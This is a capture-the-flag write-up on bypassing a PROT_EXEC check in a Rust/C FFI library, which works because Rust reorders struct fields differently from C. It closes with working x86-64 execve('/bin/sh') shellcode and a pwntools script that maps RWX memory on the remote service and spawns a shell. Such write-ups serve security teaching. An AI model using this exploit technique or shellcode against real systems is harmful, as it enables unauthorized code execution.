## Intended
The challenge provides the source for `chal` and `libi_love_ffi.so` in `chal.c` and
`lib.rs` respectively. On the Rust side, an `mmap_args` function is defined that
sets up the arguments and passes them over to C to execute. The Rust performs some
basic checks to prevent passing the `PROT_EXEC` flag in the protections field, which
should prevent allocating shellcode.

However, although the struct definitions in Rust and C are equivalent with the
layout and types exactly the same, when you are compiled they are generated
differently. Modern compilers will typically pad struct fields so that memory
accesses to those fields are faster. The problem is that Rust and C have different
padding behavior. C will attempt to align struct fields to their memory size, but
will maintain struct order. Rust will also attempt to align struct fields to their
memory size, but will not maintain struct order.

### memory layout
| offset | C          | Rust       |
|:-------|:-----------|:-----------|
| 0x00   | addr       | addr       |
| 0x04   | addr       | addr       |
| 0x08   | length     | length     |
| 0x0C   | length     | length     |
| 0x10   | protection | offset     |
| 0x14   | flags      | offset     |
| 0x18   | fd         | protection |
| 0x1C   | [ unused ] | flags      |
| 0x20   | offset     | fd         |
| 0x24   | offset     | [ unused ] |

As we can see in the above chart, the fields in Rust dont match up one-to-one to the
struct fields on the C side. This allows us to bypass the protection check in rust
and allocate shellcode.

### Solution
```x86asm filename="shellcode.asm" open
    bits 64
    
_start:
    mov rax, `/bin/sh`
    push rax
    mov eax, 0x3b
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    syscall
```

```python filename="main.py" open
from pwn import *

p = remote(args.HOST, args.PORT)

for n in [0, 0x1000, 0, 0, 0, 7]:
    p.sendlineafter(b"> ", str(n).encode())

p.send(open("shellcode", "rb").read().ljust(4096, b"\x00"))
p.sendlineafter(b"> ", b"0")

p.interactive()
```
